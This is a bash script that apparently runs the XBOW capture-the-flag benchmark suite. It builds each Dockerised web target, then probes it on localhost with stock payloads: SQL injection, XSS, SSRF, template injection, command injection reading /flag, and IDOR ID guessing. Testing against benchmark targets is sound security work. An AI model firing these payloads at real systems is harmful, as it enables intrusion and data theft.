#!/bin/bash
# Kali XBOW Benchmark Runner — 一键跑 104 靶机
# Benchmarks at: ~/xbow-benchmarks/benchmarks/
set -euo pipefail

GREEN='\033[0;32m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
BENCH_DIR="$HOME/xbow-benchmarks/benchmarks"
RESULTS="$HOME/.aimy/kali_bench_results.jsonl"
TOTAL=$(ls -d "$BENCH_DIR"/XBEN-*/ 2>/dev/null | wc -l)

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  XBOW Benchmark Runner${NC}"
echo -e "${CYAN}  Targets: ${TOTAL} | Results: ${RESULTS}${NC}"
echo -e "${CYAN}========================================${NC}"

# Load completed
declare -A DONE
if [ -f "$RESULTS" ]; then
    while IFS= read -r line; do
        name=$(echo "$line" | python3 -c "import sys,json; print(json.loads(sys.stdin.readline()).get('name',''))" 2>/dev/null || true)
        [ -n "$name" ] && DONE["$name"]=1
    done < "$RESULTS"
fi

TODO=()
for d in "$BENCH_DIR"/XBEN-*/; do
    name=$(basename "$d")
    [ -z "${DONE[$name]:-}" ] && TODO+=("$name")
done

if [ ${#TODO[@]} -eq 0 ]; then
    echo -e "${GREEN}All $TOTAL benchmarks already completed!${NC}"
    python3 -c "
import json
from collections import Counter
results = [json.loads(l) for l in open('$RESULTS') if l.strip()]
found = sum(1 for r in results if r.get('flag'))
print(f'Flags: {found}/{len(results)}')
tags = Counter()
tf = Counter()
for r in results:
    for t in r.get('tags',[]): tags[t]+=1; tf[t]+=(1 if r.get('flag') else 0)
for t,c in tags.most_common(): print(f'  {t:20s} {tf.get(t,0):3d}/{c:<3d}')
"
    exit 0
fi

echo -e "  Remaining: ${#TODO[@]} / $TOTAL\n"

FOUND=0; COUNT=0
START=$(date +%s)

for name in "${TODO[@]}"; do
    cwd="$BENCH_DIR/$name"
    config=$(python3 -c "import json; c={}
for f in ['benchmark.json','benchmark/benchmark-config.json']:
    p='$cwd/'+f
    try: c=json.load(open(p)); break
    except: pass
print(json.dumps(c))" 2>/dev/null || echo '{}')

    tags=$(echo "$config" | python3 -c "import sys,json; print(','.join(json.loads(sys.stdin.readline()).get('tags',[])))" 2>/dev/null || echo "")
    level=$(echo "$config" | python3 -c "import sys,json; print(json.loads(sys.stdin.readline()).get('level','?'))" 2>/dev/null || echo "?")

    COUNT=$((COUNT + 1))
    elapsed=$(( ($(date +%s) - START) / 60 ))
    eta=$(( COUNT > 0 ? elapsed * (${#TODO[@]} - COUNT) / COUNT : 0 ))
    echo -e "\n${CYAN}[${COUNT}/${#TODO[@]}] $name | L${level} | ${tags} | ETA: ${eta}min${NC}"

    flag=""
    status="pending"

    # Build
    echo -n "  Build... "
    out=$(cd "$cwd" && sudo docker compose build --build-arg FLAG="XBOW_KALI_2026" --build-arg flag="XBOW_KALI_2026" 2>&1) || {
        echo -e "${RED}FAIL${NC}"
        echo "{\"name\":\"$name\",\"status\":\"build_fail\",\"tags\":$(echo "$config" | python3 -c "import sys,json; print(json.dumps(json.loads(sys.stdin.readline()).get('tags',[])))"),\"ts\":\"$(date -Iseconds)\",\"error\":\"$(echo "$out" | tail -1 | sed 's/"/\\"/g')\"}" >> "$RESULTS"
        continue
    }
    echo -e "${GREEN}OK${NC}"

    # Start
    echo -n "  Start... "
    (cd "$cwd" && docker compose up -d 2>&1) > /dev/null || {
        echo -e "${RED}FAIL${NC}"
        echo "{\"name\":\"$name\",\"status\":\"start_fail\",\"ts\":\"$(date -Iseconds)\"}" >> "$RESULTS"
        continue
    }

    # Get port
    sleep 4
    port=""
    for i in $(seq 1 15); do
        port=$(docker ps --format '{{.Ports}}' 2>/dev/null | grep -oP '(\d+)(?=->\d+/tcp)' | head -1)
        [ -n "$port" ] && break
        sleep 1
    done

    if [ -z "$port" ]; then
        echo -e "${RED}NO PORT${NC}"
        (cd "$cwd" && docker compose down -v 2>/dev/null) > /dev/null || true
        echo "{\"name\":\"$name\",\"status\":\"no_port\",\"ts\":\"$(date -Iseconds)\"}" >> "$RESULTS"
        continue
    fi

    url="http://localhost:$port"
    echo -n "  :$port"

    # Hunt: by tag
    for tag in $(echo "$tags" | tr ',' ' '); do
        case "$tag" in
            idor|default_credentials|authorization|access_control)
                r=$(curl -s --max-time 5 -X POST "$url/" -d "username=test&password=test" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }

                # Try order-based IDOR
                for oid in 1 100 1001 300401; do
                    r=$(curl -s --max-time 5 "$url/order/$oid/receipt" 2>/dev/null || true)
                    f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                    [ -n "$f" ] && { flag="$f"; break 2; }
                done
                ;;
            sqli|sql_injection)
                r=$(curl -s --max-time 5 "$url/?id=1'%20OR%201=1--" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }
                ;;
            xss|reflected_xss|stored_xss)
                r=$(curl -s --max-time 5 "$url/?q=<script>alert(1)</script>" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }
                ;;
            ssrf|server_side_request_forgery)
                r=$(curl -s --max-time 5 "$url/?url=http://localhost/flag" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }
                ;;
            cmdi|command_injection)
                r=$(curl -s --max-time 5 "$url/?cmd=cat%20/flag" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }
                ;;
            ssti|template_injection)
                r=$(curl -s --max-time 5 "$url/?name={{7*7}}" 2>/dev/null || true)
                f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
                [ -n "$f" ] && { flag="$f"; break; }
                ;;
        esac
    done

    # Generic probe if not found
    if [ -z "$flag" ]; then
        for ep in "/flag" "/api/flag" "/admin" "/.flag" "/flag.txt" "/robots.txt"; do
            r=$(curl -s --max-time 4 "$url$ep" 2>/dev/null || true)
            f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
            [ -n "$f" ] && { flag="$f"; break; }
        done
    fi

    # Homepage fallback
    if [ -z "$flag" ]; then
        r=$(curl -s --max-time 4 "$url/" 2>/dev/null || true)
        f=$(echo "$r" | grep -oP 'flag\{[^}]+\}|FLAG\{[^}]+\}' | head -1)
        [ -n "$f" ] && flag="$f"
    fi

    rm -f ~/cookies.txt

    if [ -n "$flag" ]; then
        echo -e " ${GREEN}FOUND: $flag${NC}"
        FOUND=$((FOUND + 1))
        status="found"
    else
        echo -e " ${RED}NOT FOUND${NC}"
        status="not_found"
    fi

    # Cleanup
    (cd "$cwd" && docker compose down -v 2>/dev/null) > /dev/null || true

    # Save
    ts=$(date -Iseconds)
    mkdir -p "$(dirname "$RESULTS")"
    echo "{\"name\":\"$name\",\"status\":\"$status\",\"flag\":\"$flag\",\"port\":\"$port\",\"tags\":$(echo "$config" | python3 -c "import sys,json; print(json.dumps(json.loads(sys.stdin.readline()).get('tags',[])))"),\"level\":\"$level\",\"ts\":\"$ts\"}" >> "$RESULTS"
done

elapsed=$(( ($(date +%s) - START) / 60 ))
echo -e "\n${CYAN}========================================${NC}"
echo -e "${CYAN}  DONE: ${FOUND}/${COUNT} flags in ${elapsed} min${NC}"
echo -e "${CYAN}  Results: ${RESULTS}${NC}"
echo -e "${CYAN}========================================${NC}"
